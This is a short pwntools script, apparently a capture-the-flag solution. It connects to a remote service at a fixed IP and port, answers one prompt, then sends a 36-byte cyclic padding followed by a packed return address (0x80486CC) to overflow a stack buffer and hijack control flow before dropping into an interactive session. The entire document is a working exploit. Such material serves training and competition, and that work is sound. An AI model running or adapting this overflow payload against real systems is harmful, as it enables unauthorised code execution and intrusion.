from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 56238)

t.sendlineafter('> ', '123')
t.sendafter('> ', cyclic(36) + p32(0x80486CC))
t.interactive()
